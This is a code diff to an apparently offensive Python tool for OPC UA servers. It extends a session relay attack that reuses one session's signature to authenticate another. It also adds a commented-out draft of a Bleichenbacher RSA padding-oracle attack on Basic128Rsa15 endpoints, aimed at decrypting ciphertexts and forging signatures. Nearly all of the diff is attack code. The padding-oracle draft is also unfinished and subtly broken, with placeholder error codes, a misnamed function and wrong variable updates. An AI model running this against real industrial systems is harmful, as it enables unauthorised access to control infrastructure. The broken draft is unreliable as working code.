@@ -4,6 +4,8 @@ from typing import *
 from crypto import *
 from datetime import datetime
 from socket import socket, create_connection
+from random import randint
+from enum import Enum, auto
 
 import sys, os, itertools, re
 
@@ -143,6 +145,13 @@ def session_exchange(channel : ChannelState,
   resp, _ = respfield.from_bytes(convo.requestOrResponse)
   return resp
   
+# Protocols supported for current attacks.
+class TransportProtocol(Enum):
+  TCP_BINARY = auto()
+  HTTPS = auto()
+  
+# def proto_scheme(protocol : TransportProtocol) -> str:
+  
 
 # Relevant endpoint information.
 @dataclass
@@ -155,7 +164,7 @@ class EndpointInfo:
   accepts_certauth : bool
 
 # Request endpoint information from a server.
-def get_endpoints(host : str, port: int) -> List[EndpointInfo]:
+def get_endpoints(protocol : TransportProtocol, host : str, port: int) -> List[EndpointInfo]:
   with connect_and_hello(host, port) as sock:
     chan = unencrypted_opn(sock)
     resp = session_exchange(chan, getEndpointsRequest, getEndpointsResponse, 
@@ -192,6 +201,9 @@ def execute_relay_attack(
     # Now send the server nonce of this channel as a client nonce on the other channel.
     createresp2 = csr(imp_chan, login_endpoint, imp_endpoint, createresp1.serverNonce)
     
+    if createresp2.serverSignature.signature is None:
+      raise AttackNotPossible('Server did not sign nonce. An OPN attack may be needed first.')
+    
     # Make a token with an anonymous or certificate-based user identity policy.
     anon_policies = [p for p in login_endpoint.userIdentityTokens if p.tokenType == UserTokenType.ANONYMOUS]
     cert_policies = [p for p in login_endpoint.userIdentityTokens if p.tokenType == UserTokenType.CERTIFICATE]
@@ -209,9 +221,6 @@ def execute_relay_attack(
       usersig = createresp2.serverSignature
     else:
       raise AttackNotPossible('Endpoint does not allow either anonymous or certificate-based authentication.')
-    
-    if createresp2.serverSignature.signature is None:
-      log('Server did not sign the CreateSessionResponse. Is unauthenticated access allowed? In this case no reflection attack is needed.')
     
     # Now activate the first session using the signature from the second session.
     session_exchange(login_chan, activateSessionRequest, activateSessionResponse, 
@@ -329,3 +338,121 @@ def relay_attack(source : Tuple[str, int], target : Tuple[str, int]):
   
   raise AttackNotPossible('TODO: implement combination with OPN attack.')
 
+
+
+# @dataclass
+# class PaddingOracleReuseState:
+#   sock    : Optional[socket] = None
+#   counter : int = 1
+  
+# # Returns whether an RSA ciphertext has correct padding, using a Basic128Rsa15 endpoint.
+# # When possible, uses reuse_state to avoid having to repeat TCP + hello handshake for every attempt.
+# # Thread-safe whenever a different reuse_state object is used for each thread.
+# def query_padding_oracle(
+#     endpoint : endpointDescription.Type, ciphertext : bytes, reuse_state : PaddingOracleReuseState
+#   ) -> bool:
+#     assert endpoint.securityPolicyUri == SecurityPolicy.BASIC128RSA15
+#     def try_open_request():
+#       try:
+#         opc_exchange(reuse_state.sock, OpenSecureChannelMessage(
+#           secureChannelId=0,
+#           securityPolicyUri=SecurityPolicy.BASIC128RSA15,
+#           senderCertificate=endpoint.serverCertificate,
+#           receiverCertificateThumbprint=certificate_thumbprint(endpoint.serverCertificate),
+#           sequenceNumber=reuse_state.counter,
+#           requestId=reuse_state.counter,
+#           encryptedMessage=ciphertext
+#         ))
+#         return True
+#       except ServerError as err:
+#         if err.errorcode == ....:
+#           return True
+#         elif err.errorcode == ....:
+#           return False
+#         else:
+#           raise err
+    
+#     done = False
+#     if reuse_state.sock:
+#       try:
+#         padresult = try_open_request()
+#         done = True
+#       except:
+#         # On any misc. exception, assume the connection is broken and try again with a fresh socket.
+#         try:
+#           reuse_state.sock.shutdown(socket.SHUT_RDWR)
+#           reuse_state.sock.close()
+#         except:
+#           pass
+        
+#     if not done:
+#       reuse_state.sock = connect_and_hello(*parse_endpoint_url(endpoint.endpointUrl))
+#       reuse_state.counter = 1
+#       padresult = try_open_request()
+      
+#     reuse_state.counter += 1
+#     return padresult
+
+# # Carry out a padding oracle attack against a Basic128Rsa15 endpoint.
+# # Result is ciphertext**d mod n; can also be used for signature forging.
+# def rsa_decryptor(endpoint : endpointDescription.Type, ciphertext : bytes):
+#   # Bleicehnacher's original attack: https://archiv.infsec.ethz.ch/education/fs08/secsem/bleichenbacher98.pdf
+  
+#   clen = len(ciphertext)
+#   assert clen % 128 == 0 # Probably not an RSA ciphertext if the key size is not a multiple of 1024 bits.
+#   k = clen * 8
+  
+#   # Ciphertext as integer.
+#   c = 0
+#   for by in ciphertext:
+#     c *= 256
+#     c += by
+    
+#   # Extract public key from the endpoint certificate.
+#   n, e = certificate_rsakey(endpoint.serverCertificate)
+  
+#   # B encodes as 00 01 00 00 00 .. 00 00
+#   B = 2**(k-16)
+    
+#   # Oracle function.
+#   rstate = PaddingOracleReuseState()
+#   def query(candidate):
+#     # Encode int as bigendian binary to submit it to the oracle.
+#     cand_bytes = [0] * clen
+#     j = candidate
+#     for ix in reverse(range(0, clen)):
+#       cand_bytes[ix] = j % 256
+#       j /= 256
+#     assert j == 0
+#     return query_padding_oracle(endpoint, cand_bytes, rstate)
+    
+#   # Step 1: blinding. Find a random blind that makes the padding valid. Searching can be skipped if the ciphertext
+#   # already has valid padding.
+#   if query(c):
+#     s0 = 1
+#     c0 = c
+#   else:
+#     for _ in range(1, MAX_PADDINGORACLE_ITERATIONS):
+#       s0 = randint(1, 2**k)
+#       c0 = c * pow(s0, e, n) % n
+#       if query(c0):
+#         break
+  
+#   intervals = [(2 * B, 3 * B - 1)]
+  
+#   for i in range(1, MAX_PADDINGORACLE_ITERATIONS):
+#     # Step 2: searching for PKCS#1 conforming messages.
+#     if i == 1:
+#       s = n // (3*B) + (1 if n % (3*B) else 0)
+#       while not query(c0 * pow(s0, e, n) % n):
+#         s += 1
+#     elif len(intervals) > 1:
+#       s += 1
+#       while not query(c0 * pow(s0, e, n) % n):
+#         s += 1
+#     else:
+#         [(a, b)] = intervals
+#         rstart = (2 * b * s - 2 * B) // n + 1
+#         ....
+        
+    
